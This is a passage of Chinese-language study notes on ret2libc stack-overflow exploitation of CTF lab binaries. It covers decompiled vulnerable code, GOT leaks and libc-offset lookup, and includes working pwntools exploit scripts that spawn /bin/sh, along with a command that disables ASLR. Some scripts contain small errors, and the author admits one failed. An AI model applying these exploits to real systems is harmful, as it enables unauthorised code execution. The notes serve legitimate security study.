  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets(s);
  return 0;
}
```

发现隐藏在`.bss`的变量`buf2`，由于原函数没有赋值`buf2`的代码，因此需要借用`gets@plt`伪造栈帧来利用`buf2`存放`system`函数的参数

> payload 伪造栈帧如下

```
Low -> High

[0] (char*)c --(108 bytes)-- ebp --(4 bytes)-- ret_addr --...

[1] 
--[112 bytes] junk data
--(ret_addr_main = gets@plt)
--(ret_addr_gets = pop_ret_addr) --> 清除gets函数的param,执行完后ret返回,用来平衡栈帧
--(param_gets = addr of .bss; ret_addr_system = Any Address)
--(param_system = addr of .bss)
```

<img src="D:\github\pwn\pwn_study\images\ret2libc2_bss_buf2.png" alt="ret2libc2_bss_buf2" style="zoom:50%;" />

```python
system_plt = 0x8048490
gets_plt = 0x8048460
bss_buf2_addr = 0x0804A080  # param of gets
pop_ebx_ret_addr = 0x0804843d  # : pop ebx ; ret
payload = flat([gets_plt, pop_ebx_ret_addr, bss_buf2_addr, system_plt, 'b'*4, bss_buf2_addr])
```

Exploit

> * 不要忘了你`call _gets`还要再输送一次参数！
> * 需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。

```python
from pwn import *

system_plt = 0x8048490
gets_plt = 0x8048460
bss_buf2_addr = 0x0804A080  # param of gets
pop_1_ret_addr = 0x0804843d  # : pop ebx ; ret
payload = flat(['a'*112, gets_plt, pop_ebx_ret_addr, bss_buf2_addr, system_plt, 'b'*4, bss_buf2_addr])

io = process('./ret2libc2')
io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()
```

##### 平衡栈帧

> 多次调用函数，多参数

<img src="D:\github\pwn\pwn_study\images\more_params_stack_balance.png" alt="image-20220604023639862" style="zoom:50%;" />

#### Q3

##### 补充1 strtol

> `strtol`函数的用法

解释

```C
Definition:
		C库函数 long int strtol(const char *str, char **endptr, int base) 把参数 str 所指向的字符串根据给定的 base 		 转换为一个长整数（类型为 long int 型），base 必须介于 2 和 36（包含）之间，或者是特殊值 0。
Parameters:
		str -- 要转换为长整数的字符串。
		endptr -- 对类型为 char* 的对象的引用，其值由函数设置为 str 中数值后的下一个字符。
		base -- 基数，必须介于 2 和 36（包含）之间，或者是特殊值 0。
```

例子

```C
#include <stdio.h>
#include <stdlib.h>
int main() {
   char str[30] = "2030300 This is test";
   char *ptr;
   long ret;

   ret = strtol(str, &ptr, 10);
   printf("数字（无符号长整数）是 %ld\n", ret);
   printf("字符串部分是 |%s|", ptr);

   return 0;
}
```

##### 补充2 read

> read -` read from a file descriptor`

解释

```C
#include <unistd.h>
ssize_t read(int fd, void *buf, size_t count);
```

关于文件描述符

| Name            | File descriptor | Description                                                  | Abbreviation |
| --------------- | --------------- | ------------------------------------------------------------ | ------------ |
| Standard input  | **0**           | The default data stream for input, for example in a command pipeline. In the [terminal](https://www.computerhope.com/jargon/t/terminal.htm), this defaults to keyboard input from the user. | **stdin**    |
| Standard output | **1**           | The default data stream for output, for example when a command prints text. In the terminal, this defaults to the user's screen. | **stdout**   |
| Standard error  | **2**           | The default data stream for output that relates to an error occurring. In the terminal, this defaults to the user's screen. | **stderr**   |

实例

```C
read(0, buf, 0xAu);  --- 从stdin中读取最多10个字符到buf中 ---
```

##### 补充3 x86地址习惯

```C
GOT protection: Partial RELRO | GOT functions: 8
 
[0x804a00c] read@GLIBC_2.0 -> 0x80483b6 (read@plt+6) ◂— push   0 /* 'h' */
[0x804a010] printf@GLIBC_2.0 -> 0xf7e172b0 (printf) ◂— endbr32 
[0x804a014] fflush@GLIBC_2.0 -> 0xf7e32a40 (fflush) ◂— endbr32 
[0x804a018] strcpy@GLIBC_2.0 -> 0x80483e6 (strcpy@plt+6) ◂— push   0x18
[0x804a01c] puts@GLIBC_2.0 -> 0xf7e34c40 (puts) ◂— endbr32 
[0x804a020] __gmon_start__ -> 0x8048406 (__gmon_start__@plt+6) ◂— push   0x28 /* 'h(' */
[0x804a024] __libc_start_main@GLIBC_2.0 -> 0xf7de1de0 (__libc_start_main) ◂— endbr32 
[0x804a028] strtol@GLIBC_2.0 -> 0x8048426 (strtol@plt+6) ◂— push   0x38 /* 'h8' */
```

* 注意到`80`开头一般在`ELF`文件中，`f7`开头一般是`libc`中的地址

* 内存泄漏时一般选`puts : 0xf7e34c40`（原因：地址值比较高）

* 查看内存映射便可知一二

  ```C
  STACK | HEAP | CODE | DATA | RWX | RODATA
   0x8048000  0x8049000 r-xp     1000 0      /home/ganliber/Documents/ROP/ret2libc3/ret2libc3
   0x8049000  0x804a000 r--p     1000 0      /home/ganliber/Documents/ROP/ret2libc3/ret2libc3
   0x804a000  0x804b000 rw-p     1000 1000   /home/ganliber/Documents/ROP/ret2libc3/ret2libc3
   0x804b000  0x806d000 rw-p    22000 0      [heap]
  0xf7dc7000 0xf7de0000 r--p    19000 0      /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7de0000 0xf7f3b000 r-xp   15b000 19000  /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7f3b000 0xf7faf000 r--p    74000 174000 /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7faf000 0xf7fb0000 ---p     1000 1e8000 /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7fb0000 0xf7fb2000 r--p     2000 1e8000 /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7fb2000 0xf7fb3000 rw-p     1000 1ea000 /usr/lib/i386-linux-gnu/libc-2.31.so
  0xf7fb3000 0xf7fb6000 rw-p     3000 0      [anon_f7fb3]
  0xf7fc9000 0xf7fcb000 rw-p     2000 0      [anon_f7fc9]
  0xf7fcb000 0xf7fcf000 r--p     4000 0      [vvar]
  0xf7fcf000 0xf7fd1000 r-xp     2000 0      [vdso]
  0xf7fd1000 0xf7fd2000 r--p     1000 0      /usr/lib/i386-linux-gnu/ld-2.31.so
  0xf7fd2000 0xf7ff0000 r-xp    1e000 1000   /usr/lib/i386-linux-gnu/ld-2.31.so
  0xf7ff0000 0xf7ffb000 r--p     b000 1f000  /usr/lib/i386-linux-gnu/ld-2.31.so
  0xf7ffc000 0xf7ffd000 r--p     1000 2a000  /usr/lib/i386-linux-gnu/ld-2.31.so
  0xf7ffd000 0xf7ffe000 rw-p     1000 2b000  /usr/lib/i386-linux-gnu/ld-2.31.so
  0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
  ```



##### 补充4 分析补充程序

> 另一个`ret2libc3(在仓库中是ret2libc4)`
>
> * pwndbg 中的 backtrace 栏下可以显示输出（如果有的话），如下所示即可输出`puts`的真实地址
>
> * 需要编程实现输出`libc`中函数地址的原因
>
>   > 远程机可能由于`libc`版本，`ASLR`开启等等的原因的问题，本地`gdb`调试出的值并不一定可靠，所以需要以恶意代码，函数输出的形式（如下方代码的`see_something`）来显性实现内存泄漏
>
>   ```python
>   -------------Memory Leak by Function--------------
>   --------------------------------------------------
>   pwndbg> 
>   The content of the address : 0xf7e34c40
>   --------------------------------------------------
>   
>   -------------Memory Leak by gdb-------------------
>   --------------------------------------------------
>   pwndbg> got
>   
>   GOT protection: Partial RELRO | GOT functions: 8
>   ...
>   [0x804a01c] puts@GLIBC_2.0 -> 0xf7e34c40 (puts) ◂— endbr32   
>   ...
>   --------------------------------------------------
>   ```
>
> * 因此只需要知道`libc`的一个函数的地址就可以了，如`puts`，因为`Libc`中`system`和`puts`的相对位置是确定的，我们根据对应版本的`libc.so`计算其中`system`和`puts`之间的相对距离，就可以根据泄漏地址`Leaked Address`找到实际内存映像中`system`函数的真实地址!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

```C
int __cdecl main(int argc, const char **argv, const char **envp) {
  char **v4; // [esp+4h] [ebp-11Ch]
  int v5; // [esp+8h] [ebp-118h]
  char src[256]; // [esp+12h] [ebp-10Eh] BYREF
  char buf[10]; // [esp+112h] [ebp-Eh] BYREF
  const void **v8; // [esp+11Ch] [ebp-4h]

  puts("###############################");
  puts("Do you know return to library ?");
  puts("###############################");
  puts("What do you want to see in memory?");
  printf("Give me an address (in dec) :");
  fflush(stdout);
  read(0, buf, 0xAu);                <------- 执行之前将puts@got(true addr)的十进制形式输入进去(0->stdin)
------------------------------------
>>> 0x804a01c
134520860      <--- 可以通过python交互命令行将 hex -> 十进制
------------------------------------
  v8 = (const void **)strtol(buf, v4, v5); <- 返回buf字符串中的"数字"的值,该"数字"后的串赋值给v4,v5
  See_something(v8);                 <------- 调用该函数(定义见下)输出
  printf("Leave some message for me :");
  fflush(stdout);
  read(0, src, 0x100u);
  Print_message(src);
  puts("Thanks you ~");
  return 0;
}
int __cdecl See_something(const void **a1)
{
  return printf("The content of the address : %p\n", *a1);
}
```

* 注意`ASLR`中仍然保持页对齐（4KB, 2^12 = 4^3），按照十六进制，后三（*4）位是不变的

  > 即 `0xf7e34c40` 可能在远程服务器上可能显示`0x-----c40`
  >
  > 这一点可以验证泄漏的值是否正确

##### 更改libc库为同文件下libc

> libc是依赖ld版本的，因此libc和ld都要同时变化

```shell
# ganliber @ ganliber-virtual-machine in ~/Documents/ROP/ret2libc3 [21:52:25] 
$ ls
libc-2.23.so  ret2libc3

# ganliber @ ganliber-virtual-machine in ~/Documents/ROP/ret2libc3 [21:52:25] 
$ ldd ret2libc3
	linux-gate.so.1 (0xf7f03000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7cfb000)
	/lib/ld-linux.so.2 (0xf7f05000)

# ganliber @ ganliber-virtual-machine in ~/Documents/ROP/ret2libc3 [21:52:28] 
$ patchelf --replace-needed libc.so.6 ./libc-2.23.so ./ret2libc3

# ganliber @ ganliber-virtual-machine in ~/Documents/ROP/ret2libc3 [21:53:20] 
$ ldd ret2libc3
	linux-gate.so.1 (0xf7f27000)
	./libc-2.23.so (0xf7d6d000)          <----- 已经变为本路径下的了
	/lib/ld-linux.so.2 (0xf7f29000)
```

除此之外还需要更改`ld`，详见本仓库`README`中的内容



##### 查找`libc`的`plt`和`got`

> 针对特定版本的`libc`

```python
from pwn import *
libc = ELF('./libc-2.23.so')
distance = ELF.symbols["system"]-ELF.symbols["puts"]  # 求算相对距离
```

python交互

```python
*] '/home/ganliber/Documents/ROP/ret2libc3/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> io = process('./ret2libc3')
[x] Starting local process './ret2libc3'
[+] Starting local process './ret2libc3': pid 11138
>>> io.recvline()
b'###############################\n'
>>> libc.symbols["system"] - libc.symbols["puts"]
-149504
>>> io.send(str(134520860))         <--------------------------------- 此处的134520860是运行过程中泄漏的
																																 puts@got即puts的真实值 
<stdin>:1: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
>>> io.recv()
b'Do you know return to library ?\n###############################\nWhat do you want to see in memory?\nGive me an address (in dec) :'
>>> io.recv()
b'The content of the address : 0xf7e2b140\nLeave some message for me :'   <----- 显性内存泄漏
>>> hex(149504)
'0x24800'
>>> 0xf7e2b140-0x24800
4158679360            
>>> hex(4158679360)
'0xf7e06940'                  <----------- 算出无ASLR情况下system函数在进程空间中的地址
```

写payload

注意到`Print_message(src)`的源码为

```C
char src[256];
...
read(0, src, 0x100u); <--- 构造payload
Print_message(src);   <--- 发生溢出
--------------------------------------------------
int __cdecl Print_message(char *src) {
  char dest[56]; // [esp+10h] [ebp-38h] BYREF
  strcpy(dest, src);
  return printf("Your message is : %s", dest);
}
```

`strcpy`会造成溢出，因此可以利用此处的栈溢出，考虑查看**子栈帧**的`ebp`和`dest`的距离

```C
 ► 0x8048563 <Print_message+19>    call   strcpy@plt                     <strcpy@plt>
        dest: 0xffffcc60 —▸ 0xf7e855e7 (_IO_file_sync+7) ◂— 0x8a19c681
        src: 0xffffccb2 ◂— 0x41414141 ('AAAA')
```

先看到执行`strcpy`之前的栈帧布局，需要关注的是dest,查看调用`strcpy`前夕的`stack`内容

```C
04:0010│ eax 0xffffcc60 —▸ 0xf7e855e7 (_IO_file_sync+7) ◂— add    esi, 0x148a19
05:0014│     0xffffcc64 —▸ 0xf7fce000 ◂— 0x1afdb0
06:0018│     0xffffcc68 —▸ 0xf7fced60 (_IO_2_1_stdout_) ◂— 0xfbad2a84
07:001c│     0xffffcc6c —▸ 0xf7e7b39f (fflush+111) ◂— xor    edx, edx
08:0020│     0xffffcc70 —▸ 0xf7fced60 (_IO_2_1_stdout_) ◂— 0xfbad2a84
09:0024│     0xffffcc74 —▸ 0xf7fce000 ◂— 0x1afdb0
0a:0028│     0xffffcc78 —▸ 0xffffcdc8 ◂— 0x0
0b:002c│     0xffffcc7c —▸ 0xf7e67046 (printf+38) ◂— add    esp, 0x1c
0c:0030│     0xffffcc80 —▸ 0xf7fced60 (_IO_2_1_stdout_) ◂— 0xfbad2a84
0d:0034│     0xffffcc84 —▸ 0x80487b9 ◂— dec    esp /* 'Leave some message for me :' */
0e:0038│     0xffffcc88 —▸ 0xffffcdc8 ◂— 0x0
0f:003c│     0xffffcc8c ◂— 0x100
10:0040│     0xffffcc90 —▸ 0xffffccb2 ◂— 0x41414141 ('AAAA')
11:0044│     0xffffcc94 —▸ 0xf7ef2373 (read+35) ◂— pop    ebx
12:0048│ ebp 0xffffcc98 —▸ 0xffffcdc8 ◂— 0x0
```

因此需要填充的垃圾数据长度为

```C
0x48 - 0x10 = 0x38 = 56 bytes
56 + 4(ebp) = 60 bytes
```

还需要调用`read`(由于没有gets)

<img src="D:\github\pwn\pwn_study\images\more_params_stack_balance.png" alt="image-20220604023639862" style="zoom: 33%;" />

```C
0x80483b0: read@plt
```

注意此题目`.bss`区域并没有可供写入`/bin/sh`的变量

因此考虑通过**环境变量**得到

```C
system("sh")  ---> 环境变量
system("/bin/sh") ---> 绝对路径
```

也是可行的！！！

```python
$ ROPgadget --binary ret2libc3  --string "sh"
Strings information
============================================================
0x080461b2 : sh
```

又或者通过下述命令查找函数符号表，这些函数名在内存中实际上也是一些字符串，因此只需要从以`sh`结尾的函数符号名的`s`处开始读取就可以仍然当做`system`函数的参数

```python
$ strings ret2libc3 | grep sh
fflush
.shstrtab
.gnu.hash
fflush@@GLIBC_2.0
```





###### 完全与远程交互代码

> 推导
>
> ```
> Base = E(puts) - Libc(puts)
> Because: 
> 	E(system) - E(puts) = L(system) - L(puts)
> then:
> 	E(system) = [ E(puts)-L(puts) ] + L(system)
> 	          = Base + L(system)
> ```

```python
from pwn import *
io = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc-2.23.so')

---- 适配"远程" ----
io.sendlineafter(b" :", str(elf.symbols["puts"]))
io.recvuntil(b" : ")
-------------------

---- 返回字符串并转化为int,16进制 ----
libcBase = int(io.recvuntil(b"\n", drop=True), 16) - libc.symbols["puts"]
------------------------------------

# debug
success("libcBase -> {:#x}".format(libcBase))

payload = flat(cyclic(60), libcBase + libc.symbols['system'], 0xdeadbeef, next(elf.search(b"sh\x00")))

io.sendlineafter(b" :", payload)

io.interactive()

```

* 虽然这个没有打通，但是基本思想学习了很多
* 没打通的原因：库的错误使用















##### Q3 分析

> 无`"/bin/sh"`，也无`system@plt`
>

查看源码，且无PIE，只有NX

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets(s);
  return 0;
}
```

在`.bss`区仍然有隐形变量`buf2`

```C
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)
```

那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点

- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而` libc `在github上有人进行收集，如下
- https://github.com/niklasb/libc-database

所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**

**小插曲**

```
:1,$ s/str1/str2/g 用字符串 str2 替换正文中所有出现的字符串 str1
1,$ s/’/'/g
1,$ s/‘/'/g
将所有中文‘’换成''
```

> **思路**
>
> （因为有延迟绑定机制）可以先调用`puts`把`put_got`的位置
>
> 之所以要回到start函数，是因为`main`的栈帧结构是一致的（垃圾数据的填充是一样的）

<img src="D:\github\pwn\pwn_study\images\ret2libc3_flowchart_1.png" alt="ret2libc3_flowchart_1" style="zoom:50%;" />

##### Q3 exploit

> 通过使用`libc-database`来查找偏移地址
>
> 但这种方法可能对本地`LibcSearcher`不太友好

###### 内存泄漏脚本

> 最终输出 `puts` 函数的地址

```python
#!/usr/bin/env python
from pwn import *

io = process('./ret2libc3')

io.recvline()  # after this line, the puts function has been called for the first time

ret2libc = ELF('./ret2libc3')

puts_plt = ret2libc.plt['puts']

puts_got = ret2libc.got['puts']  # the addr of got['puts'], not the value of addr of puts, but the double pointer of puts

start_addr = ret2libc.symbols['_start']

payload = flat(cyclic(112), puts_plt, start_addr, puts_got)  # after first payload, the addr of puts will be leaked.

io.sendlineafter('!?',payload)

raw_data = io.recv(4)  # before you write this line, be sure you have recieved all the strings before in buffer!

print(raw_data)

puts_addr = u32(raw_data)  # recieve the addr leaked

print(hex(puts_addr))  # print out the leaked address of puts
```

###### 查找libc库的偏移

```python
$ ./find puts 140                                      
/home/ganliber/Documents/pwn_test/stack/Q_ret2libc/libc-2.23.so (local-c1d3aa79808e71885c67b9763b5e52a96cc02d16)

$ ./dump local-c1d3aa79808e71885c67b9763b5e52a96cc02d16
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003a940
offset_dup2 = 0x000d4b50
offset_read = 0x000d4350
offset_write = 0x000d43c0
offset_str_bin_sh = 0x15902b
offset___libc_start_main = 0x00018540
offset_puts = 0x0005f140
```

###### 栈溢出漏洞利用

> 利用前两步的数据，一击致命

```python
from pwn import *

''' Data from local libc-database '''
offset_system = 0x0003a940
offset_str_bin_sh = 0x15902b
offset___libc_start_main = 0x00018540
offset_puts = 0x0005f140

puts_addr = 0xf7e7d140  # data got from file exp_leak_memory.py

libcBase = puts_addr - offset_puts

system_addr = offset_system + libcBase

binsh_addr = offset_str_bin_sh + libcBase

payload = flat(cyclic(112), system_addr, cyclic(4), binsh_addr)

io = process('./ret2libc3')

io.sendlineafter('!?', payload)

io.interactive()
```















## 保护机制

```C
gcc 
canary ->  -fno-stack-protector
PIE    ->  -no-pie
```



### ASLR

* `Address Space Layout Randomization`
* 操作系统层面（全局变量）

```
/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR
/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化
/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化
```

* 查看虚拟机

  ```python
  # ganliber @ ganliber-virtual-machine in ~/Documents/ROP/Q1 [11:23:19] 
  $ cat /proc/sys/kernel/randomize_va_space
  2
  ```
  
* 关闭ASLR

  ```python
  sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
  ```

  



### PIE

* `Position-Independent Executable`

  > * 程序的防护措施，编译时生效
  > * 随机化ELF文件的映射地址（影响`.data`、`.bss`、`.text` 段的映射地址）
  > * 开启 ASLR 之后，PIE 才会生效



## 修改ELF文件libc为指定版本

遇到本地libc与题目libc不匹配问题，导致一些套路无法在本地调试和利用。要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境.于是想找下有没有更方便的方法. 于是找到了patchelf更换libc的方法。

### glibc-all-in-one与patchelf安装

glibc-all-in-one，正如其名是一个**多版本libc的下载安装管理工具**，主要支持2.19，2.23-2.29版本的libc和i686, amd64的架构。这是github一个开源项目因此我们git它既可。

安装命令：

```
git clone https://github.com/matrix1001/glibc-all-in-one.git 
cd glibc-all-in-one 
chmod a+x build download extract
```

patchelf在ubuntu直接`apt install patchelf`即可。





### 对应libc编译

我们可以通过在glibc-all-in-one目录下执行`./build`即可获对应版本的libc和ld.so

例如：`./build 2.29 i686`

下载安装编译 32位的2.29 版本libc。





### patchelf更改程序libc

执行`patchelf --set-interpreter ld.so elf` 来修改文件ld.so

执行`patchelf --replace-needed old_libc.so new_libc.so elf`来修改文件libc.so

以更改gundam文件为例,例如：

```
sudo patchelf --set-interpreter /glibc/2.26/amd64/lib/ld-2.26.so --set-rpath /glibc/2.26/amd64/lib/ ~/Desktop/pwn/buu/gumad/gundam

patchelf --replace-needed /glibc/2.23/amd64/lib/libc-2.23.so /glibc/2.26/amd64/lib/libc-
```





